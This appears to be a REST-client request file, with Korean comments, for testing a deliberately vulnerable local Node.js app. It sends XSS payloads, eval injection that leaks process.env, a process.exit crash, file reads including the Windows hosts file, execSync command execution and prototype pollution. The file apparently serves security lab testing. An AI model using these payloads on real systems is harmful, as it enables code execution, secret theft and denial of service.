### [1] 기본 연결 테스트 (정상 동작 확인)
GET http://localhost:3000 HTTP/1.1

### [2] 정상 이메일 전송 (200 OK)
POST http://localhost:3000/email HTTP/1.1
Content-Type: application/json

{
    "name": "John Doe",
    "message": "Hello World"
}

### [3] XSS 공격 (200 OK - 스크립트 실행)
POST http://localhost:3000/email HTTP/1.1
Content-Type: application/json

{
    "name": "<script>alert('XSS1')</script>",
    "message": "<img src=x onerror='alert(\"XSS2\")'>"
}

### [4] eval()을 이용한 코드 실행 (CWE-94)
POST http://localhost:3000/email HTTP/1.1
Content-Type: application/json

{
    "calc": "process.env"
}

### [5] 서버 종료 공격 (주의!)
POST http://localhost:3000/email HTTP/1.1
Content-Type: application/json

{
    "calc": "process.exit(1)"
}

### [6] 파일 시스템 접근 (CWE-643)
GET http://localhost:3000/execute?code=require('fs').readdirSync('.') HTTP/1.1

### [7] 시스템 명령어 실행 (RCE)
GET http://localhost:3000/execute?code=require('child_process').execSync('whoami').toString() HTTP/1.1

### [8] 프로토타입 오염 시도
POST http://localhost:3000/email HTTP/1.1
Content-Type: application/json

{
    "__proto__": {"isAdmin": true},
    "name": "Hacker"
}

###vul6
### 1. 기본 마크다운 변환 테스트 (200 OK 예상)
POST http://localhost:3000/markdown
Content-Type: application/json

{
  "content": "# 취약점 테스트\n이것은 **마크다운** 변환 테스트입니다."
}

### 2. Windows 명령어 실행 (500 에러 발생 but 실제로는 명령 실행됨)
POST http://localhost:3000/markdown
Content-Type: application/json

{
  "content": "명령어 테스트",
  "script": "require('child_process').execSync('echo hacked > C:\\hacked.txt')"
}

### 3. ✅ 환경 변수 유출 테스트 (FIXED: 200 OK 보장)
POST http://localhost:3000/markdown
Content-Type: application/json

{
  "content": "환경 변수 테스트",
  "calc": "(() => { try { return JSON.stringify({env: process.env}, null, 2); } catch(e) { return e.message; }})()"
}

### 4. Windows 시스템 파일 읽기 (200 OK 예상)
GET http://localhost:3000/execute?code=encodeURIComponent(require('fs').readFileSync('C:\\Windows\\System32\\drivers\\etc\\hosts','utf8'))

### 5. ✅ 프로토타입 오염 테스트 (FIXED: 200 OK 보장)
POST http://localhost:3000/markdown
Content-Type: application/json

{
  "content": "프로토타입 테스트",
  "calc": "(() => { Object.prototype.polluted = true; return '프로토타입 오염 성공'; })()"
}

### 6. 에러 핸들러 XSS 테스트 (500 에러 예상)
POST http://localhost:3000/markdown
Content-Type: application/json

{
  "content": "XSS 테스트",
  "script": "throw new Error('<script>alert(1)</script>')"
}

### 7. 프로세스 정보 유출 (200 OK 예상)
GET http://localhost:3000/execute?code=JSON.stringify(process.versions,null,2)

### 8. 서버 내부 모듈 확인 (200 OK 예상)
GET http://localhost:3000/execute?code=JSON.stringify(require('module').builtinModules,null,2)